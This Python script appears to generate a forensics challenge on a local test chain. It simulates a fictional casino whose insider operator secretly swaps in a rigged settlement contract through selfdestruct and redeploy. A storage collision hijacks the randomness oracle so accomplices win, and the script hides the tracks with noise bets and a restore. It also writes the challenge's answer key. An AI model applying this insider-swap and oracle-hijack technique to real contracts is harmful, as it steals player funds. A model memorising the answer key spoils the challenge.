#!/usr/bin/env python3
"""
Lucky Spire casino — deterministic incident chain generator.

Narrative:
  - "Lucky Spire", a provably-fair on-chain casino, runs for ~90 days (1 epoch/day).
  - Owner deploys; an operator runs daily maintenance (ephemeral game-machine churn = bait).
  - A legit house oracle (with 2 backups) fulfils randomness; oracle rotates occasionally.
  - On 3 non-obvious days, the INSIDER operator abuses the hub re-mint to swap the
    settlement engine at H for a rigged version (storage-collision repoints the oracle to
    a rogue fulfiller). During each window ~3-4 unrelated "drainer" accounts win big via
    the rogue oracle, then the engine is restored (cover-up).
  - Following the money lands on clean contracts + lucky drainers; the real tell is the
    oracle slot changing with no rotateOracle call, and H's codehash changing across history.

Accounts (mnemonic-indexed, deterministic):
  0  owner (deployer)
  1  operator (INSIDER — does the swaps)
  2  oracleA (legit primary)   3 oracleB (backup)   4 oracleC (backup)
  5  attacker/rogue oracle (the 4th fulfiller; also the jackpotFeed in rigged engine)
  10..39  honest players (30)
  50..59  drainers (10, unrelated to everyone)
"""
import common as c
import json, os, sys

RIGGED_FEED_IDX = 5   # rogue oracle == jackpotFeed baked into rigged engine
INSIDER_IDX = 1

DAY = 86400
START_TS = 1_700_000_000  # fixed, deterministic (anvil launched with --timestamp this)
EPOCHS = 90

# attack windows (epoch indexes) + which drainer accounts win in each
WINDOWS = {
    17: [50, 51, 52],
    44: [53, 54, 55, 56],
    71: [57, 58, 59],
}

ENGINE_HONEST = "src/SettlementEngine.sol:SettlementEngine"
ENGINE_RIGGED = "src/SettlementEngineRigged.sol:SettlementEngineRigged"

GAMES = [0, 1, 2]  # slot, dice, coin

state = {"txs": 0}

def log(msg):
    print(msg, flush=True)

def at_epoch(e):
    """set next-block timestamp to the start of epoch e (plus a small intra-day offset counter)."""
    return START_TS + e * DAY

_last_ts = [START_TS - 1]
def goto_epoch(e):
    """Set the next block's timestamp to the start of epoch e. Subsequent txs land there+.
    anvil auto-mines each tx; within an epoch txs advance ~1s each (fine/realistic)."""
    ts = START_TS + e * DAY
    if ts <= _last_ts[0]:
        ts = _last_ts[0] + 1
    c.set_next_timestamp(ts)
    _last_ts[0] = ts

# ------------------------------------------------------------------ deployment
def deploy():
    owner_a, owner_pk = c.acct(0)
    op_a, _ = c.acct(INSIDER_IDX)
    oracleA_a, _ = c.acct(2)

    # fund all actors generously
    for i in list(range(0, 6)) + list(range(10, 40)) + list(range(50, 60)):
        c.set_balance(c.acct(i)[0], 10**24)

    goto_epoch(0)

    # predict casino addr (chip deployed at nonce N, casino at N+1)
    n = c.nonce(owner_a)
    predicted_casino = c.compute_create(owner_a, n + 1)
    chip_cc = c.bytecode("src/ChipToken.sol:ChipToken") + c.abi_encode("c(address)", predicted_casino)[2:]
    chip = c.create(owner_pk, chip_cc)
    casino_cc = c.bytecode("src/Casino.sol:Casino") + c.abi_encode(
        "c(address,address,address)", op_a, oracleA_a, chip)[2:]
    casino = c.create(owner_pk, casino_cc)
    assert casino.lower() == predicted_casino.lower(), "minter prediction failed"

    # spawn hub + build honest engine (hub nonce 1 -> H)
    op_pk = c.acct(INSIDER_IDX)[1]
    c.send(op_pk, casino, "spawnHub()")
    hub = c.call(casino, "getHub()(address)")
    engine_cc = c.bytecode(ENGINE_HONEST)
    c.send(op_pk, casino, "buildEngine(bytes)", engine_cc)
    engine = c.call(casino, "getEngine()(address)")

    # seed bankroll (large house float, so the drain is visible but the house stays solvent on-chain)
    c.send(owner_pk, casino, "fundBankroll()", value=200_000 * 10**18)

    log(f"[deploy] chip={chip} casino={casino} hub={hub} engine(H)={engine}")
    return {
        "chip": chip, "casino": casino, "hub": hub, "engine": engine,
        "honest_engine_code": engine_cc,
    }

# ------------------------------------------------------------------ deterministic PRNG
class R:
    """tiny deterministic LCG so the chain regenerates identically."""
    def __init__(self, seed): self.s = seed & ((1<<64)-1)
    def next(self):
        self.s = (self.s * 6364136223846793005 + 1442695040888963407) & ((1<<64)-1)
        return self.s >> 16
    def rand(self, n): return self.next() % n
    def pick(self, lst): return lst[self.rand(len(lst))]

rng = R(0xC0FFEE)

# current oracle index (which legit oracle is active) + list of legit oracles
LEGIT_ORACLES = [2, 3, 4]
cur_oracle = {"idx": 2}

def seed_bytes(tag):
    return c.keccak(("0x" + tag.encode().hex()))

# ------------------------------------------------------------------ gameplay primitives
def honest_bet_and_settle(ctx, player_idx, e):
    """A player places a bet; the current legit oracle fulfils with a pseudo-random word."""
    _, pk = c.acct(player_idx)
    casino = ctx["casino"]
    game = GAMES[rng.rand(3)]
    amount = (1 + rng.rand(50)) * 10**18
    cs = seed_bytes(f"p{player_idx}-e{e}-{rng.next()}")
    # ensure chips: deposit if low
    bal = int(c.call(ctx["chip"], "balanceOf(address)(uint256)", c.acct(player_idx)[0]))
    if bal < amount:
        c.send(pk, casino, "deposit()", value=amount * 3)
    r = c.send(pk, casino, "placeBet(uint8,uint256,bytes32)", game, amount, cs)
    bet_id = _last_bet_id(casino)
    req = c.call(casino, "betRequestId(uint256)(uint256)", bet_id)
    # legit oracle fulfils with a "random" word (deterministic but unknown-looking)
    word = rng.next()
    opk = c.acct(cur_oracle["idx"])[1]
    c.send(opk, casino, "fulfillRandomness(uint256,uint256)", req, word)
    # occasional claim on win
    st = c.call(casino, "betStatus(uint256)(uint8)", bet_id)
    if st == "2":
        c.send(pk, casino, "claim(uint256)", bet_id)

def _last_bet_id(casino):
    return int(c.call(casino, "getNextBetId()(uint256)")) - 1

live_machines = []  # addresses of currently-deployed ephemeral machines

def maintenance(ctx, e):
    """Routine op maintenance: churn ephemeral game machines (BAIT). Deploys throwaway
    'machine' contracts via the hub (same generic path the attack later abuses)."""
    op_pk = c.acct(INSIDER_IDX)[1]
    for _ in range(1 + rng.rand(2)):
        r = c.send(op_pk, ctx["hub"], "deployGame(bytes)", ctx["honest_engine_code"])
        # the hub emits GameDeployed(address,uint256); read the new machine from games array
        n = int(c.call(ctx["hub"], "gameCount()(uint256)"))
        addr = c.call(ctx["hub"], "games(uint256)(address)", n - 1)
        live_machines.append(addr)

def _teardown_machines(ctx):
    """Destroy all live ephemeral machines so a hub respawn won't collide on reused nonces."""
    op_pk = c.acct(INSIDER_IDX)[1]
    for m in live_machines:
        if c.codelen(m) > 0:
            # machines are built from engine code, which has teardown()
            try: c.send(op_pk, m, "teardown()")
            except Exception: pass
    live_machines.clear()

def maybe_rotate_oracle(ctx, e):
    """Occasionally rotate the active legit oracle among the sanctioned set (noise)."""
    if rng.rand(100) < 12:
        newidx = c.acct(rng.pick(LEGIT_ORACLES))
        cur = cur_oracle["idx"]
        nxt = rng.pick([x for x in LEGIT_ORACLES if x != cur])
        cur_oracle["idx"] = nxt
        c.send(c.acct(INSIDER_IDX)[1], ctx["casino"], "rotateOracle(address)", c.acct(nxt)[0])

# ------------------------------------------------------------------ the attack
def rebuild_engine_with(ctx, code_with_args):
    """Metamorphic re-mint of the engine at H with the given code (honest or rigged).
    Sequence: teardown engine (free H) -> destroy hub -> spawn hub -> deployGame(code) as
    the hub's FIRST create (lands on H)."""
    op_pk = c.acct(INSIDER_IDX)[1]
    casino, hub, engine = ctx["casino"], ctx["hub"], ctx["engine"]
    _teardown_machines(ctx)                      # clear ephemeral machines (free reused nonces)
    c.send(op_pk, engine, "teardown()")          # free H (staff selfdestruct)
    c.send(op_pk, casino, "destroyHub()")        # destroy hub
    c.send(op_pk, casino, "spawnHub()")          # respawn -> same addr, nonce reset
    assert c.call(casino, "getHub()(address)").lower() == hub.lower(), "hub moved!"
    c.send(op_pk, hub, "deployGame(bytes)", code_with_args)  # FIRST create -> lands on H
    assert c.codelen(engine) > 0, "H empty after rebuild"

def rigged_engine_code(ctx):
    rogue = c.acct(RIGGED_FEED_IDX)[0]
    return c.bytecode(ENGINE_RIGGED) + c.abi_encode("c(address)", rogue)[2:]

def attack_window(ctx, e, drainers):
    """One attack window: swap in rigged engine (repoints oracle to rogue when next settle
    runs), drainers win via rogue oracle, then restore honest engine (cover-up)."""
    op_pk = c.acct(INSIDER_IDX)[1]
    casino = ctx["casino"]
    rogue_idx = RIGGED_FEED_IDX
    rogue_pk = c.acct(rogue_idx)[1]
    log(f"  [window e{e}] swapping rigged engine; drainers={drainers}")

    # 1. metamorphic swap -> rigged engine at H
    rebuild_engine_with(ctx, rigged_engine_code(ctx))

    # 2. trigger the collision: any settle runs the rigged engine's recordSettlement,
    #    which writes rogue into the oracle slot. Use a tiny insider-adjacent bet settled
    #    by the CURRENT legit oracle (still legit at this instant).
    trigger_idx = 50 + rng.rand(10)  # a drainer places the trigger bet
    tpk = c.acct(trigger_idx)[1]
    tbal = int(c.call(ctx["chip"], "balanceOf(address)(uint256)", c.acct(trigger_idx)[0]))
    if tbal < 2*10**18:
        c.send(tpk, casino, "deposit()", value=10*10**18)
    cs = seed_bytes(f"trigger-e{e}")
    c.send(tpk, casino, "placeBet(uint8,uint256,bytes32)", 1, 1*10**18, cs)
    tbet = _last_bet_id(casino)
    treq = c.call(casino, "betRequestId(uint256)(uint256)", tbet)
    c.send(c.acct(cur_oracle["idx"])[1], casino, "fulfillRandomness(uint256,uint256)", treq, rng.next())
    newrac = c.call(casino, "getOracle()(address)")
    assert newrac.lower() == c.acct(rogue_idx)[0].lower(), f"oracle not repointed: {newrac}"

    # 3. drainers win big via the rogue oracle (attacker grinds winning words)
    for d in drainers:
        dpk = c.acct(d)[1]
        c.send(dpk, casino, "deposit()", value=2000*10**18)  # fresh chips for this window
        for _ in range(2 + rng.rand(2)):
            game = rng.pick([0, 1, 2])
            amount = (200 + rng.rand(300)) * 10**18
            cs = seed_bytes(f"drain-{d}-e{e}-{rng.next()}")
            c.send(dpk, casino, "placeBet(uint8,uint256,bytes32)", game, amount, cs)
            bid = _last_bet_id(casino)
            req = c.call(casino, "betRequestId(uint256)(uint256)", bid)
            word = c.find_winning_word(game, cs)   # rogue oracle forces the win
            c.send(rogue_pk, casino, "fulfillRandomness(uint256,uint256)", req, word)
            if c.call(casino, "betStatus(uint256)(uint8)", bid) == "2":
                c.send(dpk, casino, "claim(uint256)", bid)
        # cash out everything at the end of the window
        bal = int(c.call(ctx["chip"], "balanceOf(address)(uint256)", c.acct(d)[0]))
        if bal > 0:
            c.send(dpk, casino, "withdraw(uint256)", bal)

    # 3.5. COVER NOISE: while the rogue is the active oracle, it also fulfils ordinary
    # players' bets with honest (random) words — some win, some lose. This dilutes the
    # rogue's win-rate so it does NOT stand out as a 100%-win fulfiller.
    players = list(range(10, 40))
    for _ in range(12 + rng.rand(8)):
        pidx = rng.pick(players)
        ppk = c.acct(pidx)[1]
        game = rng.pick([0, 1, 2])
        amount = (1 + rng.rand(40)) * 10**18
        if int(c.call(ctx["chip"], "balanceOf(address)(uint256)", c.acct(pidx)[0])) < amount:
            c.send(ppk, casino, "deposit()", value=amount * 3)
        cs = seed_bytes(f"noise-{pidx}-e{e}-{rng.next()}")
        c.send(ppk, casino, "placeBet(uint8,uint256,bytes32)", game, amount, cs)
        bid = _last_bet_id(casino)
        req = c.call(casino, "betRequestId(uint256)(uint256)", bid)
        c.send(rogue_pk, casino, "fulfillRandomness(uint256,uint256)", req, rng.next())  # honest word
        if c.call(casino, "betStatus(uint256)(uint8)", bid) == "2":
            c.send(ppk, casino, "claim(uint256)", bid)

    # 4. cover-up: restore the honest engine at H, rotate oracle back to a legit one
    rebuild_engine_with(ctx, ctx["honest_engine_code"])
    c.send(op_pk, casino, "rotateOracle(address)", c.acct(cur_oracle["idx"])[0])
    assert c.call(casino, "getOracle()(address)").lower() == c.acct(cur_oracle["idx"])[0].lower()
    log(f"  [window e{e}] cover-up complete; engine restored, oracle back to legit")

# ------------------------------------------------------------------ main loop
def run():
    ctx = deploy()
    players = list(range(10, 40))
    for e in range(1, EPOCHS):
        goto_epoch(e)
        # honest gameplay: several players bet
        n_bets = 3 + rng.rand(6)
        for _ in range(n_bets):
            honest_bet_and_settle(ctx, rng.pick(players), e)
        maybe_rotate_oracle(ctx, e)
        # maintenance (bait machine churn) most days
        if rng.rand(100) < 70:
            maintenance(ctx, e)
        # attack windows
        if e in WINDOWS:
            attack_window(ctx, e, WINDOWS[e])
        if e % 10 == 0:
            log(f"[epoch {e}] bankroll={c.call(ctx['casino'],'getBankroll()(uint256)')}")
    return ctx

if __name__ == "__main__":
    ctx = run()
    os.makedirs("out", exist_ok=True)
    # record the ground-truth answer key for the solver/flag
    answer = {
        "insider": c.acct(INSIDER_IDX)[0],
        "rogue_oracle": c.acct(RIGGED_FEED_IDX)[0],
        "drainers": [c.acct(i)[0] for ws in WINDOWS.values() for i in ws],
        "windows": WINDOWS,
        "engine_H": ctx["engine"],
        "casino": ctx["casino"],
        "hub": ctx["hub"],
        "chip": ctx["chip"],
    }
    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "ctx.json"), "w") as f:
        json.dump(ctx, f, indent=2)
    with open(os.path.join(here, "answer.json"), "w") as f:
        json.dump(answer, f, indent=2)
    log("\n=== GROUND TRUTH ===")
    log(json.dumps(answer, indent=2))
